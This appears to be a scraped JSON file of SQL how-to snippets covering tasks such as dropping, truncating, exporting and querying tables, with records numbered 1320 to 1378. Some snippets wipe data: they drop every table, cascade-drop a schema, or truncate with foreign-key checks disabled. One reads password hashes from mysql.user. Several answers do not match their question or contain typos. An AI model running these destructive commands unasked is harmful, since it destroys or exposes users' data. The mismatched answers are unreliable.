    "description": "DROP TABLE table_name;\nDELETE FROM `table_name` [WHERE condition];\n-- 'DROP TABLE' followed by the name of the table you would like -- to drop. DROP TABLE `test_table`;\nDROP TABLE tablename;\ndelete table query  DROP TABLE <table name; e.g. DROP TABLE students;\nTo remove existing tables, you use the MySQL DROP TABLE statement.  Here is the basic syntax of the DROP TABLE statement:  DROP [TEMPORARY] TABLE [IF EXISTS] table_name [, table_name] ... [RESTRICT | CASCADE] The DROP TABLE statement removes a table and its data permanently from the database. In MySQL, you can also remove multiple tables using a single DROP TABLE statement, each table is separated by a comma (,).  The TEMPORARY option allows you to remove temporary tables only. It ensures that you do not accidentally remove non-temporary tables.  The IF EXISTS option conditionally drop a table only if it exists. If you drop a non-existing table with the IF EXISTS option, MySQL generates a NOTE, which can be retrieved using the SHOW WARNINGS statement.  Note that the DROP TABLE statement only drops tables. It doesn&rsquo;t remove specific user privileges associated with the tables. Therefore, if you create a table with the same name as the dropped one, MySQL will apply the existing privileges to the new table, which may pose a security risk.  The RESTRICT and CASCADE  options are reserved for the future versions of MySQL.\n",
    "reg_date": "2021-10-12T09:55:48.000Z"
  },
  {
    "id": 1320,
    "keyword": null,
    "link": null,
    "title": " how to delete table sqlite",
    "description": "# SQLite-> DROP TABLE table_name\n",
    "reg_date": "2021-10-12T09:55:48.000Z"
  },
  {
    "id": 1321,
    "keyword": null,
    "link": null,
    "title": " how to delete user in mysql",
    "description": "DROP USER 'jeffrey'@'localhost';\nDROP USER IF EXISTS 'user'@'127.0.0.1' ;\nREVOKE ALL PRIVILEGES ON database_name.* FROM 'username'@'host'; OR  DROP USER 'username'@'host';\nDROP USER 'jeffrey'@'localhost';  FOR DELETING USER \n",
    "reg_date": "2021-10-12T09:55:48.000Z"
  },
  {
    "id": 1322,
    "keyword": null,
    "link": null,
    "title": " how to delete view in sql",
    "description": "DROP VIEW view_name;\n",
    "reg_date": "2021-10-12T09:55:48.000Z"
  },
  {
    "id": 1323,
    "keyword": null,
    "link": null,
    "title": " how to describe a table in sqlite3",
    "description": "pragma table_info('albums');\n.schema [tablename]\nsqlite> .schema my_table\n",
    "reg_date": "2021-10-12T09:55:48.000Z"
  },
  {
    "id": 1324,
    "keyword": null,
    "link": null,
    "title": " how to disable strict mode in mysql",
    "description": "->STRICT_TRANS_TABLES is responsible for setting MySQL strict mode.  ->To check whether strict mode is enabled or not run the below sql:  SHOW VARIABLES LIKE 'sql_mode'; If one of the value is STRICT_TRANS_TABLES, then strict mode is enabled, else not. In my case it gave  +--------------+------------------------------------------+  |Variable_name |Value                                     | +--------------+------------------------------------------+ |sql_mode      |STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION| +--------------+------------------------------------------+ Hence strict mode is enabled in my case as one of the value is STRICT_TRANS_TABLES.  ->To disable strict mode run the below sql:  set global sql_mode=''; [or any mode except STRICT_TRANS_TABLES. Ex: set global sql_mode='NO_ENGINE_SUBSTITUTION';]  ->To again enable strict mode run the below sql:  set global sql_mode='STRICT_TRANS_TABLES';\n",
    "reg_date": "2021-10-12T09:55:48.000Z"
  },
  {
    "id": 1325,
    "keyword": null,
    "link": null,
    "title": " how to do an if statement in sql server",
    "description": "DECLARE @Course_ID INT = 4  IF (@Course_ID = 4) Select * from Guru99 where Tutorial_ID = 4 ELSE Select * from Guru99 where Tutorial_ID != 4 \n",
    "reg_date": "2021-10-12T09:55:48.000Z"
  },
  {
    "id": 1326,
    "keyword": null,
    "link": null,
    "title": " how to download SQL in ubuntu",
    "description": "wget -qO- https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - sudo add-apt-repository \"$(wget -qO- https://packages.microsoft.com/config/ubuntu/20.04/mssql-server-2019.list)\" sudo apt-get update sudo apt-get install -y mssql-server sudo /opt/mssql/bin/mssql-conf setup systemctl status mssql-server --no-pager\nSELECT User, Host, authentication_string FROM mysql.user; \n",
    "reg_date": "2021-10-12T09:55:48.000Z"
  },
  {
    "id": 1327,
    "keyword": null,
    "link": null,
    "title": " how to download data with sql",
    "description": "select * from data;\n",
    "reg_date": "2021-10-12T09:55:48.000Z"
  },
  {
    "id": 1328,
    "keyword": null,
    "link": null,
    "title": " how to drop a database in sql server when it is in use",
    "description": "BY LOVE SINGH  USE master; GO ALTER DATABASE OnlineRestaurant2  SET SINGLE_USER  WITH ROLLBACK IMMEDIATE; GO DROP DATABASE OnlineRestaurant2;\n",
    "reg_date": "2021-10-12T09:55:49.000Z"
  },
  {
    "id": 1329,
    "keyword": null,
    "link": null,
    "title": " how to drop a trigger in postgresql",
    "description": "DROP TRIGGER [IF EXISTS] trigger-name  ON table-name [ CASCADE | RESTRICT ]; \n",
    "reg_date": "2021-10-12T09:55:49.000Z"
  },
  {
    "id": 1330,
    "keyword": null,
    "link": null,
    "title": " how to drop a unique constraint in sql",
    "description": "SHOW CREATE TABLE [tableName] -- Find the constraintID after CONSTRAINT 'constraintID' ALTER TABLE [tableName] DROP FOREIGN KEY constraintID\n",
    "reg_date": "2021-10-12T09:55:49.000Z"
  },
  {
    "id": 1331,
    "keyword": null,
    "link": null,
    "title": " how to drop all tables in postgresql",
    "description": "DROP SCHEMA public CASCADE; CREATE SCHEMA public;\nDROP TABLE IF EXISTS tablename;\nDROP SCHEMA public CASCADE; CREATE SCHEMA public;  GRANT ALL ON SCHEMA public TO postgres; GRANT ALL ON SCHEMA public TO public;\nDO $$    DECLARE      r RECORD; BEGIN   FOR r IN      (       SELECT table_name        FROM information_schema.tables        WHERE table_schema=current_schema()     )    LOOP      EXECUTE 'DROP TABLE IF EXISTS ' || quote_ident(r.table_name) || ' CASCADE';   END LOOP; END $$ ;\n",
    "reg_date": "2021-10-12T09:55:49.000Z"
  },
  {
    "id": 1332,
    "keyword": null,
    "link": null,
    "title": " how to drop all tables in sql",
    "description": "USE Databasename  SELECT  'DROP TABLE [' + name + '];' FROM    sys.tables \nBY LOVE  EXEC sp_msforeachtable \"ALTER TABLE ? NOCHECK CONSTRAINT all\" DECLARE @sql NVARCHAR(max)=''  SELECT @sql += ' Drop table ' + QUOTENAME(TABLE_SCHEMA) + '.'+ QUOTENAME(TABLE_NAME) + '; ' FROM   INFORMATION_SCHEMA.TABLES WHERE  TABLE_TYPE = 'BASE TABLE' Exec Sp_executesql @sql \nDELETE FROM my_table;\t\t\t-- all rows, needs a COMMIT to validate TUNCATE TABLE my_table;\t\t\t-- all rows, quicker, no possible roolback\n",
    "reg_date": "2021-10-12T09:55:49.000Z"
  },
  {
    "id": 1333,
    "keyword": null,
    "link": null,
    "title": " how to drop database name in postgresql",
    "description": "CREATE DATABASE testdb1; DROP DATABASE testdb1;\ndropdb 'database name' \n",
    "reg_date": "2021-10-12T09:55:49.000Z"
  },
  {
    "id": 1334,
    "keyword": null,
    "link": null,
    "title": " how to dump .csv file into mysql",
    "description": "LOAD DATA LOCAL INFILE 'c:/country.csv'  INTO TABLE country  FIELDS TERMINATED BY ','  ENCLOSED BY '\"' LINES TERMINATED BY '\\n' IGNORE 1 ROWS;\n",
    "reg_date": "2021-10-12T09:55:49.000Z"
  },
  {
    "id": 1335,
    "keyword": null,
    "link": null,
    "title": " how to duplicate table in mysql",
    "description": "                                     CREATE TABLE IF NOT EXISTS new_table LIKE existing_table;  INSERT new_table SELECT * FROM existing_table;\nCREATE table `duplicat` LIKE `orginal`; INSERT `duplicat` SELECT * FROM `orginal`;\nSELECT firstname,     lastname,     list.address  FROM list    INNER JOIN (SELECT address                FROM   list                GROUP  BY address                HAVING COUNT(id) > 1) dup            ON list.address = dup.address; \n# Duplicate rows or row INSERT INTO table (col1, col2, col3) SELECT col1, col2, col3 FROM table WHERE something...;\n# Duplicate row and change values in the duplicated row INSERT INTO table (col1, col2, col3) # manually insert data to the duplicated row SELECT \"new value\", \"new value\", \"new value\" FROM table WHERE something...;\n",
    "reg_date": "2021-10-12T09:55:49.000Z"
  },
  {
    "id": 1336,
    "keyword": null,
    "link": null,
    "title": " how to edit a value in acoulum for a table mysql cmd",
    "description": "mysql> DESCRIBE users; +---------+------------------+------+-----+-------------------+-----------------------------+ | Field   | Type             | Null | Key | Default           | Extra                       | +---------+------------------+------+-----+-------------------+-----------------------------+ | id      | int(11)          | NO   | MUL | NULL              |                             | | name    | varchar(255)     | YES  |     | NULL              |                             | | address | varchar(10)      | YES  |     | NULL              |                             | | date    | timestamp        | NO   |     | CURRENTTIMESTAMP  | on update CURRENTTIMESTAMP  | | uid     | int(10) unsigned | NO   | PRI | NULL              | auto_increment              | +---------+------------------+------+-----+-------------------+-----------------------------+\n",
    "reg_date": "2021-10-12T09:55:49.000Z"
  },
  {
    "id": 1337,
    "keyword": null,
    "link": null,
    "title": " how to edit table name in mysql",
    "description": "RENAME TABLE tb1 TO tb2;\nRENAME TABLE old_table_name TO new_table_name; \t\t\t\t\tor ALTER TABLE old_table_name RENAME TO new_table_name;  \t\t\t\t\tor ALTER TABLE old_table_name RENAME new_table_name;                 \nBecause business requirements change, we need to rename the current table to a new one to better reflect the new situation. MySQL provides us with a very useful statement that changes the name of one or more tables.  To change one or more tables, we use the RENAME TABLE statement as follows:  RENAME TABLE old_table_name TO new_table_name; The old table ( old_table_name) must exist, and the new table ( new_table_name) must not. If the new table new_table_name does exist, the statement will fail.  In addition to the tables, we can use the RENAME TABLE statement to rename views.\n",
    "reg_date": "2021-10-12T09:55:49.000Z"
  },
  {
    "id": 1338,
    "keyword": null,
    "link": null,
    "title": " how to enable mysql 5.7 root user password on linux",
    "description": "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'SOME_NEW_ROOT_PASSWORD';\n",
    "reg_date": "2021-10-12T09:55:50.000Z"
  },
  {
    "id": 1339,
    "keyword": null,
    "link": null,
    "title": " how to export db from mysql",
    "description": "mysqldump -u username -p dbname > dbexport.sql \n",
    "reg_date": "2021-10-12T09:55:50.000Z"
  },
  {
    "id": 1340,
    "keyword": null,
    "link": null,
    "title": " how to export only procedures mysql",
    "description": "# specific database mysqldump -h the_host -u the_user -p -n -d -t --routines --triggers the_database_name > the_routines.sql # all databases mysqldump -h the_host -u the_user -p -n -d -t --routines --triggers --all-databases > the_routines.sql\n",
    "reg_date": "2021-10-12T09:55:50.000Z"
  },
  {
    "id": 1341,
    "keyword": null,
    "link": null,
    "title": " how to export table data from mysql table in sql format",
    "description": "SELECT * FROM tbl_order INTO OUTFILE 'file save path/filename'\n",
    "reg_date": "2021-10-12T09:55:50.000Z"
  },
  {
    "id": 1342,
    "keyword": null,
    "link": null,
    "title": " how to fetch data from database without last column",
    "description": "SELECT fields FROM table ORDER BY id DESC LIMIT 1;\nSELECT lastName,firstName FROM Customer        WHERE lastName LIKE \"B%\"          AND city = \"Indianapolis\"          AND (phone LIKE \"%8%\" OR fax LIKE \"%8%\")\n",
    "reg_date": "2021-10-12T09:55:50.000Z"
  },
  {
    "id": 1343,
    "keyword": null,
    "link": null,
    "title": " how to fetch first 5 characters in sql",
    "description": "Select SUBSTRING(StudentName,1,5) as studentname from student\n",
    "reg_date": "2021-10-12T09:55:50.000Z"
  },
  {
    "id": 1344,
    "keyword": null,
    "link": null,
    "title": " how to find average in sql",
    "description": "/*COUNT(column_name) will return the number of rows from the column  that are not NULL*/ SELECT COUNT(column_name) FROM table_name;  /*COUNT(*) will return the number of rows from the table*/ SELECT COUNT(*) FROM table_name;\nSELECT AVG(column_name) FROM table_name WHERE condition;\n/*AVG() is an aggregate function that returns the     average value for a numeric column*/ SELECT AVG(column_name) FROM table_name;\nSELECT FIRST_NAME FROM EMPLOYEES WHERE SALARY = (SELECT AVG(SALARY) FROM EMPLOYEES);\nSELECT first_name, salary FROM employees WHERE salary <= (SELECT AVG(salary) FROM employees); \nSELECT FIRST_NAME FROM EMPLOYEES WHERE SALARY > (SELECT AVG(SALARY) FROM EMPLOYEES);\n",
    "reg_date": "2021-10-12T09:55:50.000Z"
  },
  {
    "id": 1345,
    "keyword": null,
    "link": null,
    "title": " how to find columns with null values in sql",
    "description": "declare @col varchar(255), @cmd varchar(max)  DECLARE getinfo cursor for SELECT c.name FROM sys.tables t JOIN sys.columns c ON t.Object_ID = c.Object_ID WHERE t.Name = 'ADDR_Address'  OPEN getinfo  FETCH NEXT FROM getinfo into @col  WHILE @@FETCH_STATUS = 0 BEGIN     SELECT @cmd = 'IF NOT EXISTS (SELECT top 1 * FROM ADDR_Address WHERE [' + @col + '] IS NOT NULL) BEGIN print ''' + @col + ''' end'     EXEC(@cmd)      FETCH NEXT FROM getinfo into @col END  CLOSE getinfo DEALLOCATE getinfo\n",
    "reg_date": "2021-10-12T09:55:50.000Z"
  },
  {
    "id": 1346,
    "keyword": null,
    "link": null,
    "title": " how to find constraints on a table in oracle",
    "description": "SELECT cons.OWNER \t\t\tAS CHILD_OWNER,        cons.TABLE_NAME \t\tAS CHILD_TABLE,        cons.CONSTRAINT_NAME AS CONSTAINT_NAME,        cons.CONSTRAINT_TYPE AS CONSTRAINT_TYPE,        col.OWNER \t\t\tAS PARENT_OWNER,        col.TABLE_NAME \t\tAS PARENT_TABLE,        col.COLUMN_NAME \t\tAS COLUMN_NAME FROM DBA_CONS_COLUMNS col, DBA_CONSTRAINTS cons WHERE cons.R_OWNER = col.OWNER   AND cons.R_CONSTRAINT_NAME = col.CONSTRAINT_NAME   AND cons.TABLE_NAME = 'table_name';\n",
    "reg_date": "2021-10-12T09:55:50.000Z"
  },
  {
    "id": 1347,
    "keyword": null,
    "link": null,
    "title": " how to find database collation in postgres",
    "description": "select datname,         datcollate from pg_database;\n",
    "reg_date": "2021-10-12T09:55:50.000Z"
  },
  {
    "id": 1348,
    "keyword": null,
    "link": null,
    "title": " how to find date from date table in sql",
    "description": "SELECT CONVERT(date, getdate()); \n",
    "reg_date": "2021-10-12T09:55:51.000Z"
  },
  {
    "id": 1349,
    "keyword": null,
    "link": null,
    "title": " how to find ip address of mysql database server",
    "description": "Hold the windows key on your keyboard and then press the \"R\" key to open up the \"Run\" box. Type \"cmd\" into the text box and then click \"OK\". In the black box that comes up type \"ipconfig\". Look for the title \"Ethernet adapter\" and look for \"IPV4 address\", this is your local IP address.\n",
    "reg_date": "2021-10-12T09:55:51.000Z"
  },
  {
    "id": 1350,
    "keyword": null,
    "link": null,
    "title": " how to find lowest in sql",
    "description": "SELECT first_name, last_name, salary, job_id FROM employees WHERE salary = (SELECT MIN(salary) FROM employees); \n",
    "reg_date": "2021-10-12T09:55:51.000Z"
  },
  {
    "id": 1351,
    "keyword": null,
    "link": null,
    "title": " how to find max and min salary in sql",
    "description": "SELECT FIRST_NAME , SALARY FROM EMPLOYEES WHERE SALARY IN (SELECT MAX(SALARY)AS RESULT FROM EMPLOYEES UNION SELECT MIN(SALARY)AS RESULT FROM EMPLOYEES);\nSELECT MAX(salary), MIN(salary) FROM employees;\nSELECT MAX(SALARY) FROM EMPLOYEES UNION SELECT MIN(SALARY) FROM EMPLOYEES;\n",
    "reg_date": "2021-10-12T09:55:51.000Z"
  },
  {
    "id": 1352,
    "keyword": null,
    "link": null,
    "title": " how to find names includes in sql",
    "description": "select employee_name  from employees where employee_name LIKE 'A%' OR employee_name LIKE 'B%' order by employee_name\n",
    "reg_date": "2021-10-12T09:55:51.000Z"
  },
  {
    "id": 1353,
    "keyword": null,
    "link": null,
    "title": " how to find sql server agent jobs related to a database",
    "description": "-- list of jobs; selected info about jobs SELECT   job_id ,name ,enabled ,date_created ,date_modified FROM msdb.dbo.sysjobs ORDER BY date_created \nSELECT     [sJOB].[job_id] AS [JobID]     , [sJOB].[name] AS [JobName]     , [sJSTP].[step_uid] AS [StepID]     , [sJSTP].[step_id] AS [StepNo]     , [sJSTP].[step_name] AS [StepName]     , CASE [sJSTP].[subsystem]         WHEN 'ActiveScripting' THEN 'ActiveX Script'         WHEN 'CmdExec' THEN 'Operating system (CmdExec)'         WHEN 'PowerShell' THEN 'PowerShell'         WHEN 'Distribution' THEN 'Replication Distributor'         WHEN 'Merge' THEN 'Replication Merge'         WHEN 'QueueReader' THEN 'Replication Queue Reader'         WHEN 'Snapshot' THEN 'Replication Snapshot'         WHEN 'LogReader' THEN 'Replication Transaction-Log Reader'         WHEN 'ANALYSISCOMMAND' THEN 'SQL Server Analysis Services Command'         WHEN 'ANALYSISQUERY' THEN 'SQL Server Analysis Services Query'         WHEN 'SSIS' THEN 'SQL Server Integration Services Package'         WHEN 'TSQL' THEN 'Transact-SQL script (T-SQL)'         ELSE sJSTP.subsystem       END AS [StepType]     , [sPROX].[name] AS [RunAs]     , [sJSTP].[database_name] AS [Database]     , [sJSTP].[command] AS [ExecutableCommand]     , CASE [sJSTP].[on_success_action]         WHEN 1 THEN 'Quit the job reporting success'         WHEN 2 THEN 'Quit the job reporting failure'         WHEN 3 THEN 'Go to the next step'         WHEN 4 THEN 'Go to Step: '                      + QUOTENAME(CAST([sJSTP].[on_success_step_id] AS VARCHAR(3)))                      + ' '                      + [sOSSTP].[step_name]       END AS [OnSuccessAction]     , [sJSTP].[retry_attempts] AS [RetryAttempts]     , [sJSTP].[retry_interval] AS [RetryInterval (Minutes)]     , CASE [sJSTP].[on_fail_action]         WHEN 1 THEN 'Quit the job reporting success'         WHEN 2 THEN 'Quit the job reporting failure'         WHEN 3 THEN 'Go to the next step'         WHEN 4 THEN 'Go to Step: '                      + QUOTENAME(CAST([sJSTP].[on_fail_step_id] AS VARCHAR(3)))                      + ' '                      + [sOFSTP].[step_name]       END AS [OnFailureAction] FROM     [msdb].[dbo].[sysjobsteps] AS [sJSTP]     INNER JOIN [msdb].[dbo].[sysjobs] AS [sJOB]         ON [sJSTP].[job_id] = [sJOB].[job_id]     LEFT JOIN [msdb].[dbo].[sysjobsteps] AS [sOSSTP]         ON [sJSTP].[job_id] = [sOSSTP].[job_id]         AND [sJSTP].[on_success_step_id] = [sOSSTP].[step_id]     LEFT JOIN [msdb].[dbo].[sysjobsteps] AS [sOFSTP]         ON [sJSTP].[job_id] = [sOFSTP].[job_id]         AND [sJSTP].[on_fail_step_id] = [sOFSTP].[step_id]     LEFT JOIN [msdb].[dbo].[sysproxies] AS [sPROX]         ON [sJSTP].[proxy_id] = [sPROX].[proxy_id] WHERE [sJSTP].[command] LIKE '%MyStoredProc%' ORDER BY [JobName], [StepNo]\n",
    "reg_date": "2021-10-12T09:55:51.000Z"
  },
  {
    "id": 1354,
    "keyword": null,
    "link": null,
    "title": " how to find sql server name",
    "description": "Open up SQL Server Configuration Manager (search for it in the Start menu). Click on SQL Server Services. The instance name of SQL Server is in parenthesis inline with SQL Server service. If it says MSSQLSERVER, then it's the default instance. To connect to it in Management Studio, just type . (dot) OR (local) and click Connect. If the instance name is different, then use .\\[instance name] to connect to it (for example if the instance name is SQL2008, connect to .\\SQL2008).  Also make sure SQL Server and SQL Server Browser services are running, otherwise you won't be able to connect.\n",
    "reg_date": "2021-10-12T09:55:51.000Z"
  },
  {
    "id": 1355,
    "keyword": null,
    "link": null,
    "title": " how to find table lock and row lock in mysql",
    "description": "SHOW OPEN TABLES WHERE `Table` LIKE '%[TABLE_NAME]%' AND `Database` LIKE '[DBNAME]' AND In_use > 0; \n",
    "reg_date": "2021-10-12T09:55:51.000Z"
  },
  {
    "id": 1356,
    "keyword": null,
    "link": null,
    "title": " how to find the most occuring in SQL",
    "description": "SELECT       `column`,              COUNT(`column`) AS `value_occurrence`      FROM     `my_table`     GROUP BY `column`     ORDER BY `value_occurrence` DESC     LIMIT    1;\n",
    "reg_date": "2021-10-12T09:55:51.000Z"
  },
  {
    "id": 1357,
    "keyword": null,
    "link": null,
    "title": " how to find unique element in sql",
    "description": "DISTINCT - select distinct * from employees; ==>             retrieves any row if it has at             least a single unique column. - select distinct first_name from employees; ==>                retrieves unique names               from table. (removes duplicates) - select distinct count(*) from employees;           retrieve number of unique rows           if any row has at least a single unique data.\n",
    "reg_date": "2021-10-12T09:55:51.000Z"
  },
  {
    "id": 1358,
    "keyword": null,
    "link": null,
    "title": " how to find username and password in oracle 18c",
    "description": "SQL> connect / as sysdba \n",
    "reg_date": "2021-10-12T09:55:52.000Z"
  },
  {
    "id": 1359,
    "keyword": null,
    "link": null,
    "title": " how to force truncate a table in mysql",
    "description": "SET FOREIGN_KEY_CHECKS = 0;  TRUNCATE table $table_name;  SET FOREIGN_KEY_CHECKS = 1; \n-- If you do not need a condition or limit the rows: TRUNCATE TABLE tblYourTable; -- Not Foreign key constrained  -- Or  SET FOREIGN_KEY_CHECKS = 0;  TRUNCATE YourTable1; TRUNCATE YourTable2;  SET FOREIGN_KEY_CHECKS = 1;  -- -------------------------------------------------------- -- Otherwise: DELETE FROM tblYourTable WHERE condition;  -- Or  DELETE FROM tblYourTable LIMIT row_count;\nDELETE FROM mytest.instance; ALTER TABLE mytest.instance AUTO_INCREMENT = 1;\n",
    "reg_date": "2021-10-12T09:55:52.000Z"
  },
  {
    "id": 1360,
    "keyword": null,
    "link": null,
    "title": " how to generate a unique random number in mysql",
    "description": "#query  SELECT FLOOR(RAND() * 99999) AS random_num  FROM YourTableName WHERE \"random_num\"  NOT IN (   SELECT YourColumnName FROM YourTableName) LIMIT 1 \nDO      SELECT LEFT(UUID(), 8) INTO @var;     INSERT INTO col (@var); WHILE there_is_a_unique_constraint_violation\n",
    "reg_date": "2021-10-12T09:55:52.000Z"
  },
  {
    "id": 1361,
    "keyword": null,
    "link": null,
    "title": " how to get all dates in a month in oracle",
    "description": "-- All dates between 01/01/2021 and 15/01/2021 SELECT to_date('01/01/2021', 'DD/MM/YYYY') + ROWNUM - 1 FROM ALL_OBJECTS WHERE ROWNUM <= to_date('15/01/2021', 'DD/MM/YYYY')  \t- to_date('01/01/2021', 'DD/MM/YYYY') + 1;\n",
    "reg_date": "2021-10-12T09:55:52.000Z"
  },
  {
    "id": 1362,
    "keyword": null,
    "link": null,
    "title": " how to get all table names in sql query",
    "description": "BY LOVE SINGH  SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\n",
    "reg_date": "2021-10-12T09:55:52.000Z"
  },
  {
    "id": 1363,
    "keyword": null,
    "link": null,
    "title": " how to get all tables in sql",
    "description": "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nSELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'\nBY LOVE SINGH on May 19 2020  SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nSELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG=db_name()  and TABLE_NAME like'%table_name%'--to check particular table\n",
    "reg_date": "2021-10-12T09:55:52.000Z"
  },
  {
    "id": 1364,
    "keyword": null,
    "link": null,
    "title": " how to get alternate records from a table in sql",
    "description": "Select studentId from (Select rowno, studentId from student) where mod(rowno,2)=1\n",
    "reg_date": "2021-10-12T09:55:52.000Z"
  },
  {
    "id": 1365,
    "keyword": null,
    "link": null,
    "title": " how to get column name in db from an sqlalchemy attribute model",
    "description": "class User(Base):     __tablename__ = 'user'     id = Column('id', String(40), primary_key=True)     email = Column('email', String(50))     firstName = Column('first_name', String(25))     lastName = Column('last_name', String(25))     addressOne = Column('address_one', String(255))   from sqlalchemy.inspection import inspect # columns = [column.name for column in inspect(model).c]  # Also if we want to know that User.firstName is first_name then: columnNameInDb = inspect(User).c.firstName.name # The following will print: first_name print(columnNameInDb) \n",
    "reg_date": "2021-10-12T09:55:52.000Z"
  },
  {
    "id": 1366,
    "keyword": null,
    "link": null,
    "title": " how to get current mysql version",
    "description": "SELECT VERSION ();\nmysql -V\n",
    "reg_date": "2021-10-12T09:55:52.000Z"
  },
  {
    "id": 1367,
    "keyword": null,
    "link": null,
    "title": " how to get data between a last week in mysql",
    "description": "SELECT id FROM tbl WHERE date >= curdate() - INTERVAL DAYOFWEEK(curdate())+6 DAY AND date < curdate() - INTERVAL DAYOFWEEK(curdate())-1 DAY \n",
    "reg_date": "2021-10-12T09:55:52.000Z"
  },
  {
    "id": 1368,
    "keyword": null,
    "link": null,
    "title": " how to get date in sql",
    "description": "GETDATE()\nSELECT CURRENT_DATE from dual;\nCAST(GETDATE() AS DATE)\nSELECT getdate()\n",
    "reg_date": "2021-10-12T09:55:53.000Z"
  },
  {
    "id": 1369,
    "keyword": null,
    "link": null,
    "title": " how to get ddl for materialized view",
    "description": "-- Views (use USER_VIEWS or DBA_VIEWS if needed): SELECT TEXT FROM ALL_VIEWS WHERE upper(VIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('VIEW', 'VIEW_NAME', 'OWNER_NAME') FROM DUAL;  -- Materialized views (use USER_VIEWS or DBA_VIEWS if needed): SELECT QUERY FROM ALL_MVIEWS WHERE upper(MVIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'VIEW_NAME', 'OWNER_NAME')  FROM DUAL;\n",
    "reg_date": "2021-10-12T09:55:53.000Z"
  },
  {
    "id": 1370,
    "keyword": null,
    "link": null,
    "title": " how to get duplicate records with multiple field in sql",
    "description": "SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1 \nSELECT [CaseNumber], COUNT(*) AS Occurrences FROM [CaseCountry] GROUP BY [CaseNumber] HAVING (COUNT(*) > 1)\n/* Gets reps */ SELECT fieldA, COUNT(*) FROM tableA GROUP BY fieldA HAVING COUNT(*) > 1  /* Use reps to filter results */ SELECT a.* FROM tableA a JOIN ( \tSELECT fieldA, COUNT(*) as 'count' \tFROM tableA \tGROUP BY fieldA \tHAVING COUNT(*) > 1 ) b ON a.fieldA = b.fieldA \nSELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1\n&bull; SELECT first_name, COUNT (first_name) FROM employees GROUP BY first_name HAVING (COUNT(first_name) > 1);\n",
    "reg_date": "2021-10-12T09:55:53.000Z"
  },
  {
    "id": 1371,
    "keyword": null,
    "link": null,
    "title": " how to get first 10 records of a table in mysql",
    "description": "SELECT *FROM yourTableName ORDER BY yourIdColumnName LIMIT 10;\n",
    "reg_date": "2021-10-12T09:55:53.000Z"
  },
  {
    "id": 1372,
    "keyword": null,
    "link": null,
    "title": " how to get initials in sql",
    "description": "SELECT UPPER(FIRST_NAME) , LOWER(LAST_NAME)          , SUBSTR(FIRST_NAME , 1,1) || SUBSTR(LAST_NAME , 1,1)  AS INITIALS FROM EMPLOYEES ; \n",
    "reg_date": "2021-10-12T09:55:53.000Z"
  },
  {
    "id": 1373,
    "keyword": null,
    "link": null,
    "title": " how to get inserted id in sql",
    "description": "/*  inserted id in SQL Server */ -- SCOPE_IDENTITY() last identity generated for ANY TABLE in the CURRENT SESSION and the CURRENT SCOPE     INSERT INTO TableA (...) VALUES (...)     SET @LASTID = SCOPE_IDENTITY() -- @@IDENTITY last identity generated for ANY TABLE in the CURRENT SESSION     INSERT INTO TableA (...) VALUES (...)     SET @LASTID = @@IDENTITY -- IDENT_CURRENT('TableA') last identity for a SPECIFIC TABLE in ANY SESSION and ANY SCOPE     SET @LASTID = IDENT_CURRENT('TableA') -- OUTPUT clause of the INSERT statement EVERY ROW inserted via that STATEMENT     DECLARE @NewIds TABLE(ID INT, ...)     INSERT INTO TableA (...)     OUTPUT Inserted.ID, ... INTO @NewIds     SELECT ...\n",
    "reg_date": "2021-10-12T09:55:53.000Z"
  },
  {
    "id": 1374,
    "keyword": null,
    "link": null,
    "title": " how to get inserted id in sql server",
    "description": "SELECT SCOPE_IDENTITY();\n",
    "reg_date": "2021-10-12T09:55:53.000Z"
  },
  {
    "id": 1375,
    "keyword": null,
    "link": null,
    "title": " how to get last row of table in sql",
    "description": "mysql> select *from getLastRecord ORDER BY id DESC LIMIT 1;\n",
    "reg_date": "2021-10-12T09:55:53.000Z"
  },
  {
    "id": 1376,
    "keyword": null,
    "link": null,
    "title": " how to get list of synonyms in oracle",
    "description": "-- Depending on connected user grants: SELECT * FROM USER_SYNONYMS WHERE SYNONYM_NAME = 'syn_name';  -- User synonyms SELECT * FROM ALL_SYNONYMS WHERE TABLE_NAME = 'table_name';\t  -- Available to user SELECT * FROM DBA_SYNONYMS WHERE TABLE_OWNER = 'schema_name'; -- All schemas\n",
    "reg_date": "2021-10-12T09:55:53.000Z"
  },
  {
    "id": 1377,
    "keyword": null,
    "link": null,
    "title": " how to get max from each department in sql",
    "description": "--Find out the name of top earner in each departments --Output has Name, Department name and max salary of the department  SELECT E.FIRST_NAME , D.DEPARTMENT_NAME, E.SALARY FROM EMPLOYEES E JOIN DEPARTMENTS D ON E.DEPARTMENT_ID = D.DEPARTMENT_ID WHERE SALARY IN(SELECT MAX(E.SALARY) FROM EMPLOYEES E JOIN DEPARTMENTS D ON E.DEPARTMENT_ID = D.DEPARTMENT_ID GROUP BY DEPARTMENT_NAME);\nSELECT firstname, MAX(salary) FROM department d LEFT OUTER JOIN employee e ON (d.department_id = e.department_id) GROUP BY department_id; \n",
    "reg_date": "2021-10-12T09:55:53.000Z"
  },
  {
    "id": 1378,
    "keyword": null,
    "link": null,
    "title": " how to get max salary in each department in sql",
